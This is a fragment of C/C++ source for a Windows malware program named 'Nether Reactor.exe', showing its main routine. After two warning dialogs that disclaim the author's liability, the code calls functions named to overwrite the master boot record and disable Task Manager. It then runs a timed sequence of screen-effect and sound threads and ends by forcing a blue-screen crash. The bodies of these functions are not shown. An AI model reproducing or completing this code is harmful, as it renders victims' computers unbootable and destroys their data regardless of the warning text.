Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Nether Reactor.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Nether Reactor.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				killmbr();
				disabletaskmgr();
				icondll(1);
				sound1();
				HANDLE thread0 = CreateThread(0, 0, drawnetherreactoricon, 0, 0, 0);
				HANDLE thread0c = CreateThread(0, 0, chouchu, 0, 0, 0);
				HANDLE thread0d = CreateThread(0, 0, shader3, 0, 0, 0);
				HANDLE thread1 = CreateThread(0, 0, mypayload1, 0, 0, 0);
				HANDLE thread2 = CreateThread(0, 0, mypayload1b, 0, 0, 0);
				HANDLE thread3 = CreateThread(0, 0, mypayload1c, 0, 0, 0);
				HANDLE thread4 = CreateThread(0, 0, drawshell32icon, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread1, 0);
				TerminateThread(thread2, 0);
				TerminateThread(thread3, 0);
				TerminateThread(thread0d, 0);
				sound2();
				HANDLE thread4c = CreateThread(0, 0, mypayload4, 0, 0, 0);
				HANDLE thread5 = CreateThread(0, 0, mypayload2, 0, 0, 0);
				HANDLE thread6 = CreateThread(0, 0, mypayload2b, 0, 0, 0);
				HANDLE thread7 = CreateThread(0, 0, mypayload2c, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread4, 0);
				TerminateThread(thread5, 0);
				TerminateThread(thread6, 0);
				TerminateThread(thread7, 0);
				TerminateThread(thread4c, 0);
				sound3();
				HANDLE thread8 = CreateThread(0, 0, rgbscreen, 0, 0, 0);
				HANDLE thread9 = CreateThread(0, 0, drawbignetherreactoricon, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread8, 0);
				TerminateThread(thread9, 0);
				sound4();
				HANDLE thread10 = CreateThread(0, 0, mypayload5, 0, 0, 0);
				HANDLE thread11 = CreateThread(0, 0, rgb, 0, 0, 0);
				HANDLE thread12 = CreateThread(0, 0, mypayload6, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread10, 0);
				TerminateThread(thread11, 0);
				TerminateThread(thread12, 0);
				sound5();
				HANDLE thread13 = CreateThread(0, 0, lines, 0, 0, 0);
				HANDLE thread14 = CreateThread(0, 0, fanseyuan, 0, 0, 0);
				HANDLE thread15 = CreateThread(0, 0, mypayload7, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread13, 0);
				TerminateThread(thread14, 0);
				sound6();
				HANDLE thread16 = CreateThread(0, 0, colorfangxing, 0, 0, 0);
				HANDLE thread17 = CreateThread(0, 0, colorlines, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread15, 0);
				TerminateThread(thread16, 0);
				TerminateThread(thread17, 0);
				sound7();
				HANDLE thread18 = CreateThread(0, 0, fansefangxing, 0, 0, 0);
				HANDLE thread19 = CreateThread(0, 0, mypayload8, 0, 0, 0);
				HANDLE thread20 = CreateThread(0, 0, whitelines, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread18, 0);
				TerminateThread(thread19, 0);
				TerminateThread(thread20, 0);
				sound8();
				HANDLE thread21 = CreateThread(0, 0, coloryuan, 0, 0, 0);
				HANDLE thread22 = CreateThread(0, 0, copycur, 0, 0, 0);
				HANDLE thread23 = CreateThread(0, 0, drawcur, 0, 0, 0);
				HANDLE thread24 = CreateThread(0, 0, payload1, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread21, 0);
				TerminateThread(thread22, 0);
				TerminateThread(thread23, 0);
				TerminateThread(thread24, 0);
				sound9();
				HANDLE thread25 = CreateThread(0, 0, Color, 0, 0, 0);
				HANDLE thread27 = CreateThread(0, 0, balls, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread25, 0);
				TerminateThread(thread27, 0);
				sound10();
				HANDLE thread28 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
				HANDLE thread29 = CreateThread(0, 0, squares, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread28, 0);
				TerminateThread(thread29, 0);
				TerminateThread(thread0, 0);
				TerminateThread(thread0c, 0);
				bsod();
				return 0;
			}


		}
	}
}